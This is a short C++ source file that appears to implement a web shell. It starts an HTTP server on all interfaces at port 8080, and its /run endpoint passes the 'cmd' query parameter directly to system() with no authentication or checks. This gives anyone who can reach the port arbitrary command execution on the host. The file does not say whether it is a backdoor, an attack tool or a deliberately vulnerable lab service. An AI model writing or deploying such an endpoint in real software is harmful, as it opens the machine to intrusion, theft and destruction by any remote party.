
#include "WebServer.h"

#include <stdexcept>
#include <iostream>

#define SERVICE_A_PORT 8080

void WebServer::run()
{
    httplib::Server svr;

    svr.Get("/run", [this](const httplib::Request& req, httplib::Response& res)
    {
        auto it = req.params.find("cmd");
        if (it == req.params.end())
        {
            res.status = 500;
            res.set_content("ERROR", "text/plain");
            return;
        }

        std::string cmd = it->second;
        system(cmd.c_str());

        res.status = 200;
        res.set_content("OK", "text/plain");
    });

    std::cout << "[+] Web server listening on port " << SERVICE_A_PORT << std::endl;
    svr.listen("0.0.0.0", SERVICE_A_PORT);
}
